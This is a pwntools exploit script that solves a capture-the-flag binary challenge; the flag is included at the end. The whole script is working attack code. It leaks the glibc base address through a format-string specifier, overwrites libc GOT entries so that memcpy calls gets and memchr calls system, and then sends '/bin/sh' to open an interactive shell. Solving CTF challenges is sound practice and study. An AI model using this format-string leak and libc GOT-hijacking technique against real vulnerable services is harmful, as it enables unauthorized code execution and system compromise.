from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal_patched', '''
    b *(main+269)
    b *(main+283)
    continue
''')

# p = remote('guess-who-stack.harkonnen.b01lersc.tf', 8443, ssl=True)

# Leak glibc base address
p.recvuntil(b'First shot...')
p.sendline(b'%13$p')
p.recvuntil(b'\nPalms are sweaty, knees weak, arms are heavy ')
glibc_base_addr = int(p.recv(14), 16)-0x28150
log.info(f'glibc base address: {hex(glibc_base_addr)}')

# Libc GOT hijacking
glibc_e = ELF('./libc.so.6')
# Overwrite GOT entry of memcpy (printf->__vfprintf_internal->__printf_buffer->__printf_buffer_write->__memmove_evex_unaligned_erms) with gets
p.recvuntil(b'He opens his mouth but the words don\'t come out... ')
p.sendline(f'{glibc_base_addr+0x1fe150} {glibc_base_addr+glibc_e.symbols['gets']}'.encode())
# Overwrite GOT entry of memchr (_IO_gets->_IO_getline->_IO_getline_info->__memchr_evex) with system
p.recvuntil(b'\nHe\'s chokin how, everbody\'s jokin now... ')
p.send(f'{glibc_base_addr+0x1fe040} {glibc_base_addr+glibc_e.symbols['system']}'.encode())
# Input for gets as argument for system
p.sendline(b' /bin/sh;')

p.interactive()

# Reference: https://github.com/n132/Libc-GOT-Hijacking
# bctf{th3_m0m3nt_you_0wn_1t_n3ver_l3t_1t_g0_93ae4ae4d96b}